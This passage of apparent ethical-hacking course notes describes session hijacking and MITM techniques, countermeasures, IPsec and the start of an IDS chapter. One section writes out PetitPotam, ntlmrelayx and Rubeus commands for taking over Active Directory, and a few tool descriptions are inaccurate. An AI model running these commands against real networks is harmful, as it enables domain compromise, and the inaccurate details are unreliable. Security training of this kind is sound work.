				- Sniffing HTTPS Traffic: If the victim has already established an HTTPS connection with a secured web application, the attacker intercepts the victim’s HTTPS traffic using techniques such as ARP spoofing.
				- Capturing Cookies: The attacker captures the authentication cookie from the victim’s HTTPS traffic. Since cookies are compressed and encrypted, the attacker cannot directly read the cookie value.
				- Sending Malicious HTTPS Requests: The attacker sends multiple HTTPS requests to the web application, each with the captured cookie value prepended by random characters.
				- Analyzing Compression Length: By observing the size of the encrypted and compressed HTTPS responses, the attacker identifies patterns in the compression ratio. These patterns allow the attacker to infer the actual value of the authentication cookie by analyzing the length of the data sent.
				- Hijacking the Session: Once the attacker predicts the authentication cookie, they use it to impersonate the victim and hijack their session with the web application. This allows the attacker to access confidential information such as passwords, social security numbers, and credit card details.
		- Detection and Tools: Attackers commonly use tools like CrimeCheck to detect whether a web server has TLS or HTTP compression enabled. If compression is enabled, the server is vulnerable to CRIME attacks.
	- Session Hijacking Using Forbidden Attack:
		- A forbidden attack is a type of man-in-the-middle (MITM) attack that occurs when a cryptographic nonce is reused during the establishment of an HTTPS session with a server. According to TLS specifications, nonces (arbitrary, one-time-use pieces of data) must never be reused. This attack exploits vulnerabilities in TLS implementations where the same nonce is mistakenly reused during data encryption with the Advanced Encryption Standard–Galois/Counter Mode (AES-GCM) in the TLS handshake.
		- Reusing a nonce during the TLS handshake allows attackers to perform a MITM attack by generating cryptographic keys used for authentication. This enables them to monitor, hijack, and manipulate the connection. After bypassing HTTPS protections, the attacker can inject malicious code or forged content, such as JavaScript or fake web forms, prompting the victim into disclosing confidential information like bank account details, passwords, or social security numbers.
		- Steps in Forbidden Attack:
			- The attacker monitors the connection between the victim and the web server and sniffs the nonce from the TLS handshake messages.
			- The attacker generates authentication keys using the nonce and hijacks the connection.
			- All the traffic between the victim and the web server flows through the attacker’s machine.
			- The attacker injects JavaScript code or fake web fields into the transmission towards the victim.
			- The victim reveals sensitive information such as bank account numbers, passwords, and social security numbers to the attacker.
	- Session Hijacking Using Session Donation Attack:
		- In a session donation attack, the attacker donates their own session ID to the target user. To carry out this attack, the attacker first obtains a valid session ID by logging into a service and then provides the same session ID to the target user. This session ID links the target user to the attacker’s account page without revealing any information to the victim. When the target user clicks the link and enters their details (such as username, password, or payment information) in a form, the entered details are linked to the attacker’s account.
		- To initiate this attack, the attacker can use techniques such as cross-site scripting (XSS), man-in-the-middle (MITM) attacks, or session fixation to send their session ID to the target.
		- Steps in Session Donation Attack:
			- First, the attacker logs into a service, establishes a legitimate connection with the target web server, and deletes any stored information.
			- The target web server (e.g., http://citibank.com/) issues a session ID, such as 0D6441FEA4496C2, to the attacker.
			- The attacker then donates their session ID (e.g., http://citibank.com/?SID=0D6441FEA4496C2) to the victim and lures the victim into clicking it to access the website.
			- The victim clicks the link, believing it to be legitimate, and it opens the server’s page in the victim’s browser with the session ID (SID=0D6441FEA4496C2). The victim then enters their information on the page and submits it.
			- The attacker can now log in as themselves and acquire the victim’s information.
- Network-Level Session Hijacking:
	- Network-level session hijacking relies on compromising transport and Internet protocols used by web applications at the application layer. By targeting network-level sessions, attackers can gather critical information that is used to exploit application-level sessions.
	- Three-way Handshake:
		- The TCP three-way handshake establishes a connection between two parties by exchanging essential parameters. First, the client, in the CLOSED state, sends its Initial Sequence Number (ISN) with the SYN flag, transitioning to the SYN-SENT state.
		- The server, in the LISTENING state, acknowledges the client’s ISN, sends its own ISN with the SYN flag, and moves to the SYN-RECEIVED state.
		- Finally, the client acknowledges the server’s ISN and transitions to the ESTABLISHED state, with the server doing the same upon receiving the acknowledgment, enabling communication.
		- To terminate the connection, the RST flag forces an immediate shutdown to the CLOSED state, while the FIN flag initiates a graceful closure, transitioning to the CLOSE-WAIT state.
		- For packets to be accepted during communication, their sequence numbers must fall within the expected range; otherwise, they are dropped, and an acknowledgment with the expected sequence number is sent. Successful communication requires IP addresses, port numbers, and sequence numbers.
		- An attacker can easily determine the IP address and port number, as these are visible in the IP packets and remain constant throughout the session. However, sequence numbers change with each packet, making them harder to predict. For a blind hijack, the attacker must accurately guess the sequence numbers.
		- If the attacker successfully tricks the server into accepting and executing spoofed packets, they can hijack the session. By anticipating the next sequence number and acknowledgment (ACK) number that the client will send, the attacker can spoof the client’s address and initiate communication with the server.
	- Types of Network-Level Session Hijacking:
		- TCP/IP Hijacking:
			- TCP/IP hijacking involves an attacker intercepting an established connection between two communicating parties by using spoofed packets to impersonate one of them. The attacker redirects the TCP traffic to their own machine, causing the victim’s connection to hang. The attacker can then communicate with the host machine on the victim’s behalf.
			- To carry out a TCP/IP hijacking attack, the attacker must be on the same network as the victim, while the target server and victim machine can be located anywhere. This technique is particularly effective against systems that rely on one-time passwords.
			- TCP/IP Hijacking Steps:
				- In TCP/IP hijacking, the attacker intercepts a victim’s connection and uses their IP address to send spoofed packets with predicted sequence numbers.
				- The receiver processes the spoofed packet, updates the sequence number, and sends an acknowledgment (ACK) to the victim.
				- Unaware of the spoofed packet, the victim ignores the ACK, leading to a desynchronized connection.
				- The attacker then continuously sends spoofed packets, maintaining communication with the receiver while the victim’s connection hangs.
				- The server mistakenly drops packets from the victim, allowing the attacker to successfully hijack the session and control the communication.
		- IP Spoofing (Source-Routed Packets):
			- Source routed packets allow attackers to gain unauthorized access by using a trusted host’s IP address. This type of attack enables the attacker to create acceptable packets to insert into an active TCP session. The attacker first spoofs the trusted host’s IP address, tricking the server into accepting packets as if they were from the trusted host. Using the source-routing technique, the attacker specifies the path the packets take from the source to the destination, convincing the server it is communicating with the legitimate user.
			- After successfully spoofing the IP address, the attacker manipulates the sequence and acknowledgment (ACK) numbers. The forged packets are then injected into the TCP session before the client can respond. This leads to a desynchronized state, as the sequence and ACK numbers are no longer aligned. The original packets from the client are lost because the server processes the attacker’s packet with a new Initial Sequence Number (ISN). Subsequent packets are also source routed to a destination specified by the attacker, completing the hijack.
		- RST Hijacking:
			- RST hijacking involves injecting an authentic-looking (forged) reset (RST) packet into an active connection using a spoofed source IP address and a predicted acknowledgment (ACK) number. If the attacker accurately predicts the ACK number, the victim accepts the reset packet as legitimate and terminates the connection, believing it was sent by the source.
			- This attack can be executed using packet-crafting tools such as Colasoft Packet Builder and TCP/IP analysis tools such as tcpdump.
		- Blind Hijacking:
			- In blind hijacking, an attacker injects malicious data or commands into an intercepted TCP session, even when source-routing is disabled. To perform this attack, the attacker must correctly guess the next Initial Sequence Number (ISN) of a computer attempting to establish a connection.
			- While the attacker can send malicious data or commands, such as altering password settings to gain access from another location, they cannot view the response. To see the response, a Man-in-the-Middle (MITM) attack would be a more effective option.
		- UDP Hijacking:
			- The User Datagram Protocol (UDP) does not use packet sequencing or synchronization, making UDP sessions more vulnerable to attacks than TCP sessions. Since UDP is connectionless, it is easier to modify data without the victim noticing. In a network-level session hijack, the attacker sends a forged server reply to a client’s UDP request before the server can respond, taking control of the session.
			- The server’s reply can be easily intercepted using sniffing techniques. A Man-in-the-Middle (MITM) attack can further facilitate UDP hijacking by preventing the server's reply from reaching the client in the first place.
			- UDP Hijacking Working:
				- Spoofing the Source IP Address: Since UDP does not require a handshake before data transmission, attackers can send UDP packets with a spoofed source IP address, impersonating another host.
				- Intercepting Traffic: The attacker sends forged UDP packets to either the client or server. These packets appear to come from a legitimate source but may contain malicious data or instructions.
				- Manipulating Communication: By injecting false information into the data stream or initiating unauthorized requests, the attacker can manipulate the behavior of an application relying on UDP traffic.
		- Man-in-The-Middle (Packet Sniffing) Attack Using Forged ICMP and ARP Spoofing:
			- An MITM (Man-in-the-Middle) attack involves intercepting communication between a client and server using a packet sniffer. The attacker changes the client’s default gateway to reroute packets through their own machine.
			- This is achieved through two techniques: Forged ICMP and ARP Spoofing. In both methods, the attacker manipulates the routing of packets in transit between the client and server, redirecting them through the attacker’s machine.
			- Forged Internet Control Message Protocol (ICMP):
				- The Internet Control Message Protocol (ICMP) is an extension of IP used to send error messages. In this attack, the attacker forges ICMP packets to deceive the client and server. These forged ICMP packets are used to redirect traffic between the client and server through the hijacker’s machine. The attacker sends error messages, falsely indicating issues in processing packets via the original connection, which causes the client and server to route traffic through the attacker’s path instead.
			- Address Resolution Protocol (ARP) Spoofing:
				- Hosts use Address Resolution Protocol (ARP) to map IP addresses to MAC (hardware) addresses. ARP spoofing involves manipulating the ARP tables of hosts by broadcasting false ARP replies. The attacker sends forged ARP replies to update the ARP tables of hosts that are broadcasting ARP requests. This causes the traffic to be routed through the attacker’s machine instead of the legitimate destination IP address.
		- PetitPotam Hijacking:
			- In a PetitPotam attack, an attacker forces a domain controller (DC) to initiate authentication to the attacker’s server. The attacker uses Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC) API to hijack the authentication session. The attacker’s SMB server manipulates the session, making the domain controller believe the attacker is a legitimate user, thus allowing the attacker to capture the domain controller’s NTLM hash. To carry out this attack, the attacker must have valid credentials of a legitimate user within the network.
			- Once the attacker obtains the NTLM hash, they relay it to the Active Directory Certificate Services (AD CS) to generate a certificate. In some cases, AD CS may also act as the domain controller. Using the generated certificate, the attacker gains administrative privileges, taking full control of the AD server and, by extension, the entire network managed by the domain controller.
			- PetitPotam Hijacking Steps:
				- The attacker uses previously captured NTLM credentials to authenticate with the target server.
				- The attacker utilizes the EfsRpcOpenFileRaw command from the MS-EFSRPC API to coerce the target server into performing NTLM authentication for another system.
				- The attacker then initiates an NTLM relay attack to gain remote access to the target Active Directory Certificate Services (AD CS).
				- Finally, the attacker creates an AD certificate, which grants administrative privileges to the target AD server.
			- Commands to Perform PetitPotam Hijacking Attack:
				- Use the following command to identify the certificate authority:
					=> certutil.exe
				- Use the following command from the Impacket toolkit to set up HTTP/SMB configuration and capture credentials from the domain controller (DC):
					=> ntlmrelayx.py -t <URL of Certificate Authority with web enrollment> -smb2support --adcs --template DomainController
				- To force authentication using the captured credentials via the MS-EFSRPC API call, run:
					=> python3 PetitPotam.py -d <CA name> -u <Username> -p <Password> <Listener-IP> <IP of DC>
				- If the DC is vulnerable, can launch PetitPotam without credentials to receive the certificate’s NTLM hashes by running:
					=> python3 PetitPotam.py <Attacker’s IP> <IP of DC>
				- After obtaining the NTLM hashes, use password-cracking tools like Rubeus to request a Kerberos ticket for the machine containing DC account privileges:
					=> Rubeus.exe asktgt /outfile:<output_file.kirbi> /dc:<DC-IP> /domain:<domain name> /user:<Domain username> /ptt /certificate:<NTLM hashes received from above command>
- Session Hijacking Tools:
	- Hetty (github.com) :  Hetty is an HTTP toolkit designed for security research, enabling attackers to perform man-in-the-middle (MITM) HTTP proxy attacks. It utilizes logs and advanced search functionalities to enhance the attack process. Hetty offers several features, including a MITM HTTP proxy with logging and advanced search capabilities, an HTTP client for manually creating and editing requests as well as replaying proxied ones, and the ability to intercept and manually review requests and responses by editing, sending, receiving, or canceling them.
	- Caido (caido.io) : Caido is a web security auditing toolkit designed for security professionals to intercept and view HTTP requests in real time while browsing. It allows customization and testing of requests against large wordlists, automatically modifies incoming requests using regex rules, and enables the manual resending of requests to test endpoints.
	- bettercap (www.bettercap.org) : Bettercap is a portable framework written in Go that enables security researchers, red teamers, and reverse engineers to perform reconnaissance and execute various attacks on Wi-Fi networks, Bluetooth Low Energy devices, wireless HID devices, and IPv4/IPv6 networks.
	- Burp Suite (portswigger.net)
	- OWASP ZAP (www.zaproxy.org)
	- WebSploit Framework (sourceforge.net)
	- sslstrip (pypi.org)
	- JHijack (sourceforge.net)
- Session Hijacking Countermeasures:
	- All networks using TCP/IP are vulnerable to various types of session hijacking attacks. These attacks are particularly difficult to detect, and users often fail to notice them unless the attacker causes significant damage.
	- Signs of Session Hijacking Attack:
		- A sudden surge in network activity, leading to decreased system performance.
		- Overloaded servers due to simultaneous requests from both the legitimate client and the hijacker.
	- Session Hijacking Detection Methods:
		- Manual Method (Using Packet Sniffing Software)
			- The manual method involves using packet-sniffing software such as Wireshark and SteelCentral Packet Analyzer to monitor session hijacking attacks. The packet sniffer captures packets in transit across the network, which are then analyzed using various filtering tools.
			- Forced ARP Entry:
				- A forced ARP entry involves replacing the MAC address of a compromised machine in the server's ARP cache with a different one to restrict network traffic to the compromised machine.
				- A forced ARP entry should be performed in the following cases:
					- Repeated ARP updates
					- Frames exchanged between the client and server with different MAC addresses
					- ACK storms
		- Automatic Method (IDS and IPS):
			- The automatic method involves using intrusion detection systems (IDS) and intrusion prevention systems (IPS) to monitor incoming network traffic. If a packet matches any attack signature in the internal database, the IDS generates an alert, while the IPS blocks the traffic from entering the network.
	- Protecting Against Session Hijacking:
		- Use Secure Shell (SSH) to establish a secure communication channel.
		- Transmit authentication cookies over HTTPS connections.
		- Generate a new session ID upon login and accept only server-generated IDs.
		- Enforce session timeouts and automatically destroy expired sessions.
		- Avoid including session IDs in URLs or query strings.
		- Encrypt data in transit and implement a defense-in-depth strategy.
		- Use long random session keys for security.
		- Require multifactor authentication (MFA) or strong authentication like Kerberos.
		- Switch from a hub network to a switch network to reduce ARP spoofing risks.
		- Configure anti-spoofing rules on gateways.
		- Use IDS/IPS or ARPwatch to monitor ARP cache poisoning.
		- Implement IPsec to encrypt session data.
		- Use VPNs like PPTP or L2TP for secure remote connections.
		- Restrict cookies using firewalls and browser settings.
		- Enable HTTPOnly and SameSite cookie attributes.
		- Disable HTTP compression to prevent compression-based attacks.
		- Regularly update platform patches, browsers, and security configurations.
		- Monitor session activity for unusual behavior, such as multiple logins from different locations.
		- Educate users on logging out properly and using strong, unique passwords.
		- Implement continuous authentication using behavioral biometrics like typing patterns.
		- Use a challenge-response mechanism (e.g., CAPTCHA) when suspicious activity is detected.
		- Enforce an absolute session timeout, regardless of user activity.
	- Web Development Guidelines to Prevent Session Hijacking:
		- Attackers typically hijack sessions by exploiting vulnerabilities in session establishment mechanisms. Web developers often overlook security, but following these guidelines during development can help minimize or eliminate the risk of session hijacking:
			- Create session keys using long, random strings or numbers to make them difficult to guess.
			- Regenerate the session ID after a successful login to prevent session fixation attacks.
			- Encrypt both session data and the session key during transmission between users and web servers.
			- Implement SSL/TLS to encrypt all network communication.
			- Expire sessions immediately when the user logs out.
			- Prevent eavesdropping within the network.
			- Reduce the lifespan of sessions and cookies.
			- Use restrictive cache directives for HTTP and HTTPS traffic, such as:
				- "Cache-Control: no-cache, no-store"
				- "Pragma: no-cache"
				- Equivalent META tags on all, or at least sensitive, web pages.
			- Avoid creating sessions for unauthenticated users unless necessary.
			- Use the HTTPOnly attribute for cookies storing session IDs.
			- Set the Secure flag on cookies to ensure they are only sent over HTTPS and encrypt them before transmission.
			- Verify that all session requests originate from the same IP address and user agent.
			- Implement continuous device verification to ensure the session remains controlled by the legitimate user.
			- Use risk-based authentication at different levels before granting access to sensitive information.
			- Perform authentication and integrity verification between VPN endpoints.
			- Destroy server-side sessions upon user deauthentication instead of relying solely on session expiration.
			- Ensure that the web application redirects HTTP requests to HTTPS using server settings or redirection techniques.
			- Require user re-authentication and generate a new session before granting access to sensitive functions.
			- Use secure session management provided by trusted web frameworks instead of implementing custom session handling.
			- Enforce HTTPS on all pages of the web application, not just the login pages.
	- Web User Guidelines to Prevent Session Hijacking:
		- Avoid clicking on links received through emails or instant messages (IMs).
		- Use firewalls to block malicious content and restrict cookie access.
		- Ensure that websites are certified by trusted certifying authorities.
		- Clear history, offline content, and cookies after confidential transactions.
		- Prefer HTTPS over HTTP when transmitting sensitive data.
		- Always log out by clicking the logout button instead of just closing the browser.
		- Disable or remove untrusted add-ons, enabling them only when necessary.
		- Use one-time passwords (OTP) for critical transactions (e.g., credit card payments).
		- Regularly update antivirus software to prevent malware from stealing cookies.
		- Avoid accessing sensitive accounts or making financial transactions over public Wi-Fi.
		- Disable auto-connect to open Wi-Fi networks.
		- Keep operating system, browsers, and plugins up to date.
		- Use encrypted messaging and email services for sensitive communication.
		- Avoid saving passwords in browsers.
		- Use incognito mode on shared computers.
		- Be cautious when granting apps access to sensitive information.
		- Use secure session handlers for storing and managing session tokens.
	- Session Hijacking Detection Tools:
		- USM Anywhere (cybersecurity.att.com): USM Anywhere (AT&T Cybersecurity) is a comprehensive security tool that provides threat detection, incident response, and compliance management across cloud, on-premises, and hybrid environments. Security professionals use it to detect session hijacking attempts and perform asset discovery, intrusion detection, security automation, SIEM and log management, endpoint detection and response (EDR), threat detection and intelligence, and vulnerability assessment.
		- Wireshark (Wireshark.org) : Wireshark is a network protocol analyzer that captures and analyzes live network traffic. It supports various network types, including Ethernet, IEEE 802.11 (Wi-Fi), PPP/HDLC, ATM, Bluetooth, USB, Token Ring, Frame Relay, and FDDI. Wireshark relies on WinPcap to capture packets, allowing security professionals to monitor and detect session hijacking attempts in real time by analyzing network activity and identifying suspicious behavior.
		- Quantum Intrusion Prevention System (IPS) (www.checkpoint.com)
		- SolarWinds Security Event Manager (www.solarwinds.com)
		- IBM Security Network Intrusion Prevention System (www.ibm.com)
		- LogRhythm (logrhythm.com)
	- Approaches to Prevent Session Hijacking:
		- HTTP Strict Transport Security (HSTS):
			- HTTP Strict Transport Security (HSTS) is a web security policy designed to protect HTTPS websites from man-in-the-middle (MITM) attacks. It enforces secure communication by requiring web browsers to interact with the server exclusively over HTTPS, automatically converting all insecure HTTP connections to HTTPS.
			- This ensures that all communication between the web server and browser remains encrypted and that responses originate from an authenticated server, preventing session hijacking attempts.
		- Token Binding:
			- Token Binding enhances security by protecting client-server communication against session hijacking. When a user logs into a web application, a session ID (token) is generated and used to authenticate requests. Attackers can hijack a session by capturing and reusing this token. With token binding, the client generates a unique public-private key pair for each connection.
			- Upon connecting to the server, the client signs a message using its private key and sends it along with its public key. The server then verifies the signature using the public key, ensuring that only the legitimate client—who holds the private key—can initiate the session. Since each connection uses a new key pair, an attacker cannot reuse a captured signature, making session hijacking significantly more difficult.
	- Approaches to Prevent MITM Attacks:
		- Man-in-the-middle (MITM) attacks occur when attackers intercept traffic between two endpoints. These attacks are often passive, making them difficult for victims to detect. Since detection is challenging, prevention is the most effective defense.
		- The following approaches help prevent MITM attacks:
			- DNS over HTTPS (DoH): DNS over HTTPS (DoH) is an enhanced version of the DNS protocol designed to prevent attackers and ISPs from snooping on users’ web activities or DNS queries during the lookup process. Unlike traditional DNS, DoH encrypts DNS queries using HTTPS, sending them through port 443 to blend with regular HTTPS traffic, making interception significantly harder. DoH also improves privacy by sending only a portion of the requested domain name to fetch results, rather than the full URL. This prevents attackers from reconstructing browsing behavior. Major web browsers like Chrome, Mozilla Firefox, and Microsoft Edge have supported DoH for years, with Mozilla making it the default for U.S. users in 2020.
			- WPA3 Encryption: Wi-Fi Protected Access 3 (WPA3) is a wireless security protocol designed to enhance encryption and authentication in Wi-Fi networks. It prevents unauthorized users from connecting to a network by using stronger encryption mechanisms. Unlike its predecessor (WPA2), WPA3 offers protection against brute-force attacks, making it significantly harder for attackers to gain access and conduct MITM attacks.
			- VPN (Virtual Private Network): A VPN creates an encrypted tunnel over a public network, ensuring secure transmission of sensitive data between endpoints. By using key-based encryption, VPNs prevent attackers from intercepting or decrypting communication, reducing the risk of MITM attacks.
			- Two-Factor Authentication (2FA): Two-factor authentication adds an extra layer of security by requiring users to provide a second verification factor (e.g., a one-time code sent to their phone) in addition to their password. This prevents attackers from easily compromising accounts, even if they steal login credentials, reducing the risk of session hijacking and brute-force attacks.
			- Password Manager: A password manager is a tool used to securely store and manage credentials. It generates strong, unique passwords for web applications and encrypts them under a master key, preventing attackers from intercepting and exploiting weak passwords in MITM attacks.
			- Zero-Trust Principles: Zero-trust security follows the principle of "Never trust, always verify." It requires strict authentication and access controls for all users, whether they are inside or outside the network. Even internal users must undergo authentication, minimizing the risk of unauthorized access and MITM attacks.
			- Public Key Infrastructure (PKI): Public Key Infrastructure (PKI) is a framework for managing digital certificates to establish secure communication. It ensures that entities involved in communication are legitimate by verifying certificates issued by trusted Certificate Authorities (CAs). Any attempt to use a fake certificate can be detected, preventing MITM attacks.
			- Network Segmentation: Network segmentation involves dividing a network into smaller, isolated sub-networks to enhance security. This limits an attacker’s ability to move laterally within the network and intercept communications, reducing the risk of MITM attacks and unauthorized access to sensitive data.
	- IPsec (Internet Protocol Security):
		- IPsec is a protocol suite developed by the Internet Engineering Task Force (IETF) to secure IP communications by authenticating and encrypting each IP packet in a communication session. It provides cryptographically based security for both IPv4 and IPv6, ensuring secure data transmission over networks.
		- IPsec supports various security features, including network-level peer authentication, data origin authentication, data integrity verification, encryption for data confidentiality, and replay protection. It is commonly used to implement VPNs and to enable secure remote access to private networks via dial-up connections. IPsec operates in two encryption modes: transport mode and tunnel mode, with both communicating devices required to share a public key for secure communication.
		- IPsec policies can be configured and managed through Group Policy settings within Active Directory, allowing administrators to enforce security policies at the domain, site, or organizational unit level. At the IP layer, IPsec provides comprehensive security, protecting both IP and upper-layer protocols such as TCP, UDP, ICMP, and BGP. Its robust security capabilities make it a key component in modern secure networking.
		- Security Services Provided by IPsec:
			- Replay Attack Protection (prevention of packet retransmission attacks)
			- Data Confidentiality (encryption to protect sensitive information)
			- Access Control (restricting unauthorized access)
			- Connectionless Integrity (ensuring that transmitted data is not altered)
			- Data Origin Authentication (verifying the source of transmitted data)
			- Data Integrity (ensuring data remains unaltered in transit)
			- Limited Traffic-flow Confidentiality (hiding metadata about traffic patterns)
			- Network-level Peer Authentication (verifying the legitimacy of communicating devices)
		- Components of IPsec:
			- IPsec Driver: A software component responsible for performing protocol-level functions required to encrypt and decrypt packets.
			- Internet Key Exchange (IKE): A protocol that generates security keys for IPsec and other cryptographic protocols, enabling secure communication.
			- Internet Security Association and Key Management Protocol (ISAKMP): A framework that establishes and manages security associations (SAs), allowing two computers to communicate securely by encrypting exchanged data.
			- Oakley: A key exchange protocol that utilizes the Diffie-Hellman algorithm to generate a master key and session-specific keys for IPsec data transfer.
			- IPsec Policy Agent: A Windows OS service that enforces IPsec policies for all network communications initiated from the system.
		- Steps in the IPsec Process:
			- The consumer sends a message to the service provider.
			- The consumer's IPsec driver checks the outgoing packet's address or type against the IP filter.
			- If a match is found, the IPsec driver notifies ISAKMP to initiate security negotiations with the service provider.
			- The service provider's ISAKMP receives the security negotiation request.
			- Both parties initiate a key exchange, establishing an ISAKMP Security Association (SA) and a shared secret key.
			- Both parties agree on the security level for the information exchange, establishing IPsec SAs and encryption keys.
			- The consumer's IPsec driver encrypts and transfers packets to the appropriate connection type for transmission to the service provider.
			- The service provider receives the encrypted packets and transfers them to its IPsec driver.
			- The service provider's IPsec driver uses the inbound SA and key to verify the digital signature and begin decryption.
			- The provider's IPsec driver transfers the decrypted packets to the OSI transport layer for further processing.
		- Modes of IPsec:
			- The configuration of IPsec involves two different modes: tunnel mode and transport mode. These modes are associated with the functions of two core protocols: Encapsulation Security Payload (ESP) and Authentication Header (AH). The choice of mode depends on the specific requirements and implementation of IPsec.
			- Transport Mode:
				- In transport mode, IPsec encrypts only the payload of the IP packet while leaving the IP header intact. This ensures that only the data payload is encrypted or authenticated. Transport mode is primarily used for end-to-end communication between two hosts.
				- For Encapsulation Security Payload (ESP) in transport mode, IPsec encrypts only the payload, leaving the header unchanged. It authenticates the two connected computers and offers optional encryption for data transfer. Additionally, it is compatible with Network Address Translation (NAT), making it suitable for VPN services in NAT-based networks.
			- Tunnel Mode:
				- In tunnel mode, IPsec encapsulates the entire IP packet, including both the payload and the original IP header, and then encrypts the entire packet. This encapsulated packet becomes the payload of a new IP packet with a new IP header.
				- For Authentication Header (AH) in tunnel mode, IPsec authenticates both the payload and the header, providing higher security than transport mode. Once the encrypted data is received, the IPsec-compliant device decrypts it. Tunnel mode is commonly used to create VPNs over the Internet for network-to-network communication (e.g., between routers and linked sites), host-to-network communication (e.g., remote user access), and host-to-host communication (e.g., private chat). It is compatible with Network Address Translation (NAT) and supports NAT traversal.
				- In tunnel mode, Encapsulation Security Payload (ESP) encrypts and optionally authenticates the entire inner IP packet, while AH authenticates the entire inner IP packet along with selected fields of the outer IP header. Tunnel mode is typically used between two gateways or between a host and a gateway.
		- IPsec Architecture:
			- IPsec provides security services at the network layer, offering flexibility in selecting the necessary security protocols and the algorithms used for these services. To meet the required security objectives, corresponding cryptographic keys may be employed when necessary. The security services provided by IPsec include access control, data origin authentication, connectionless integrity, anti-replay protection, and confidentiality. To achieve these objectives, IPsec utilizes two traffic security protocols, AH and ESP, along with cryptographic key management protocols and procedures.
			- Protocol Structure of the IPsec Architecture:
				- Authentication Header (AH): Provides integrity and data origin authentication, with an optional anti-replay feature.
				- Encapsulating Security Payload (ESP): Offers all the services provided by AH, along with confidentiality.
				- IPsec Domain of Interpretation (DOI): Defines payload formats, types of exchanges, and naming conventions for security information such as cryptographic algorithms and security policies. IPsec DOI enables ISAKMP for use with IP when IPsec relies on ISAKMP to negotiate security associations.
				- Internet Security Association and Key Management Protocol (ISAKMP): A key protocol in the IPsec architecture that establishes the required security for various types of communications—including government, private, and commercial—by integrating authentication, key management, and security associations.
				- Policy: IPsec policies help enforce network security by defining when and how to secure data, as well as specifying security methods at different network levels. These policies can be configured to meet the security requirements of a system, domain, site, organizational unit, and more.
		- IPsec Authentication and Confidentiality:
			- IPsec employs two different security services for authentication and confidentiality:
			- Authentication Header (AH): AH provides connectionless integrity, data origin authentication, and optional anti-replay protection for the data payload and certain portions of the IP header in each packet. However, it does not support data confidentiality (encryption). When establishing a Security Association (SA), the receiver can opt for anti-replay protection as an additional security measure.
			- Encapsulating Security Payload (ESP): ESP offers confidentiality in addition to the services provided by AH, including data origin authentication, connectionless integrity, and anti-replay protection. However, in transport mode, ESP does not provide integrity and authentication for the entire IP packet. ESP can be used alone, in combination with AH, or in a nested configuration. By default, it protects only the IP data payload. In tunnel mode, it secures both the payload and the IP header.
	- Session Hijacking Prevention Tools:
		- Checkmarx One SAST (checkmarx.com): Checkmarx One SAST is a comprehensive source-code analysis solution designed to identify, track, and fix both technical and logical flaws in source code, including security vulnerabilities, compliance issues, and business logic problems. CxSAST supports open-source analysis (CxOSA), allowing for licensing and compliance management, vulnerability alerts, policy enforcement, and reporting. This tool is compatible with a wide range of operating systems, programming languages, and frameworks. Security professionals can use this tool to prevent various session hijacking attacks, including Man-in-the-Middle (MITM) attacks, session fixation attacks, and Cross-Site Scripting (XSS) attacks.
		- Fiddler (www.telerik.com): Fiddler is a web debugging proxy used for security testing of web applications. It can decrypt HTTPS traffic and manipulate requests through an MITM decryption technique. Fiddler logs all HTTP(S) traffic between a computer and the Internet. Security professionals can use Fiddler to test web applications by debugging traffic from systems and manipulating or editing web sessions.
		- Nessus (www.tenable.com)
		- Invicti (www.invicti.com)
		- Wapiti (wapiti-scanner.github.io)


--------------------------------------------------

# Evading IDS, Firewalls, and Honeypots

- IDS and IPS:
	- An Intrusion Detection System (IDS) is a software-based or hardware-based security solution that monitors inbound and outbound network traffic for suspicious patterns that may indicate a security breach. It analyzes traffic for signatures matching known intrusion patterns and triggers an alert when a match is found. Depending on the type of traffic being monitored, an IDS can be placed either outside or inside the firewall to detect suspicious activity originating from external or internal sources.
	- An Intrusion Prevention System (IPS) is an advanced form of IDS, often referred to as an "active IDS," as it not only detects intrusions but also takes action to prevent them.
	- IPS is classified into two types: host-based IPS (HIPS) and network-based IPS (NIPS).
	- How IDS Detect Intrusions:
		- An Intrusion Detection System (IDS) detects intrusions using three primary methods:
		- Signature Recognition:
			- Signature recognition, also known as misuse detection, identifies events that indicate potential abuse of a system or network resource. This technique involves creating models of known intrusions and comparing incoming events against these models to detect threats. IDS signatures are designed to recognize attacks without disrupting normal system traffic. Only actual attacks should match the model to minimize false alarms.
			- This method identifies attacks by comparing network traffic against known intrusion patterns. While effective for detecting known threats, it can trigger false positives and requires frequent updates to recognize evolving threats.
		- Anomaly Detection:
			- Anomaly detection, also known as "not-use detection," differs from signature recognition by identifying deviations from normal traffic patterns. It relies on a database of anomalies and flags events that fall outside the established tolerance threshold as potential attacks. This method detects intrusions based on the fixed behavioral characteristics of users and system components. The most challenging aspect of anomaly detection is accurately modeling normal usage to minimize false positives.
			- This method identifies deviations from normal network behavior, flagging unusual activity as potential threats. While useful for detecting unknown attacks, it can generate false alarms due to network unpredictability and requires precise modeling of normal behavior.
		- Protocol Anomaly Detection:
			- Protocol anomaly detection analyzes network traffic to identify deviations from established protocol standards or expected behavior patterns. It operates on the assumption that most network protocols follow defined rules and structures. Any deviation from these norms may indicate malicious activity or a misconfiguration.
			- It detects unusual packet structures, sequence orders, and response times, helping identify misconfigurations and malicious activity.
			- The functioning of a protocol anomaly detector:
				- Baseline behavior: Establish a baseline of normal protocol behavior, including structure, sequence, timing, and content of traffic.
				- Anomaly identification: Monitor traffic for deviations, such as unusual packet structures, sequence issues, or protocol violations.
				- Detection rules: Define rules based on protocol specifications to guide the IDS in identifying anomalies.
	- Types of Intrusion Detection Systems:
		- Network-Based Intrusion Detection Systems (NIDS):
			- Network-based intrusion detection systems (NIDS) monitor all incoming network traffic to detect anomalies and malicious data. Unlike firewalls that primarily block large amounts of traffic, NIDS thoroughly inspects every packet. It captures and analyzes all network traffic, generating alerts at the IP or application level based on detected threats.
			- NIDS are more distributed than host-based intrusion detection systems (HIDS), identifying anomalies at both the router and host levels. They audit packet contents, log information about malicious activity, and assign threat levels to detected risks. This threat level helps security teams stay vigilant.
			- Typically, NIDS operate using a black-box device placed in a promiscuous mode within the network, passively listening for intrusion patterns. These systems detect malicious activities such as denial-of-service (DoS) attacks, port scans, and unauthorized attempts to access systems by monitoring network traffic.
		- Host-Based Intrusion Detection Systems (HIDS):
			- A host-based intrusion detection system (HIDS) monitors and analyzes individual system behavior. Unlike NIDS, which focus on network traffic, HIDS is installed directly on a device, ranging from desktop computers to servers. It is particularly effective at detecting unauthorized insider activity and unauthorized file modifications.
			- HIDS primarily tracks changes within local systems and is often more platform-specific, with a greater focus on Windows OS. However, versions are also available for UNIX-based systems. These mechanisms typically audit events occurring on a specific host.
